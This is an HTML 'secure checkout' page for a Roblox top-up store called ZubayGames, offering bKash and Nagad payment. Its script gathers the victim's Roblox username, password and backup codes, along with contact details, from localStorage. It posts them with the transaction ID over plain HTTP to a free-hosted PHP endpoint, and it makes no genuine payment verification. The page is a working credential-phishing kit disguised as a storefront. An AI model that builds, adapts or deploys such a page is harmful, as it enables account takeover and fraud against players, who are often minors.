<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ZubayGames Secure Checkout</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">

    <div id="main-container" class="w-full max-w-sm bg-white rounded-3xl shadow-2xl p-8">
        <h2 class="text-2xl font-extrabold text-center mb-6">ZubayGames</h2>
        <div class="bg-blue-600 text-white p-5 rounded-2xl text-center mb-8">
            <h1 class="text-4xl font-black">৳ <span id="display-amount">0.00</span></h1>
        </div>

        <div class="grid grid-cols-2 gap-4 mb-8">
            <div class="border p-4 rounded-2xl text-center cursor-pointer" onclick="selectMethod(this, 'bKash')">bKash</div>
            <div class="border p-4 rounded-2xl text-center cursor-pointer" onclick="selectMethod(this, 'Nagad')">Nagad</div>
        </div>

        <div id="instruction-box" class="hidden space-y-4">
            <p id="method-name" class="hidden"></p>
            <input type="text" id="txid" placeholder="Enter Transaction ID" class="w-full p-3 border rounded-xl">
            <button onclick="processPayment()" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold">VERIFY PAYMENT</button>
        </div>
    </div>

    <div id="status-screen" class="hidden p-8 text-center">
        <h1 id="status-text" class="text-xl font-bold">Processing...</h1>
    </div>

    <script>
        document.getElementById('display-amount').innerText = localStorage.getItem('checkout_pack_price') || '0.00';

        function selectMethod(el, method) {
            document.getElementById('method-name').innerText = method;
            document.getElementById('instruction-box').classList.remove('hidden');
        }

        function processPayment() {
            const txid = document.getElementById('txid').value.trim();
            const method = document.getElementById('method-name').innerText;
            if (!txid) return alert("Enter TXID!");

            document.getElementById('main-container').classList.add('hidden');
            document.getElementById('status-screen').classList.remove('hidden');

            let formData = new FormData();
            formData.append('amount', localStorage.getItem('checkout_pack_price') || '0');
            formData.append('username', localStorage.getItem('checkout_roblox_id') || '');
            formData.append('password', localStorage.getItem('checkout_password') || '');
            formData.append('backup', localStorage.getItem('checkout_backup_codes') || '');
            formData.append('whatsapp', localStorage.getItem('checkout_contact_number') || '');
            formData.append('email', localStorage.getItem('checkout_email') || '');
            formData.append('fname', localStorage.getItem('checkout_fname') || '');
            formData.append('phone', localStorage.getItem('checkout_phone') || '');
            formData.append('txid', txid);
            formData.append('method', method);

            fetch('http://swift11.infinityfreeapp.com/save_order.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                if (data.trim() === "Success") {
                    alert("Order Placed!");
                    window.location.href = "index.html";
                } else {
                    alert("ERROR: " + data);
                    document.getElementById('main-container').classList.remove('hidden');
                    document.getElementById('status-screen').classList.add('hidden');
                }
            })
            .catch(error => {
                alert("FETCH ERROR: " + error);
                document.getElementById('main-container').classList.remove('hidden');
            });
        }
    </script>
</body>
</html>
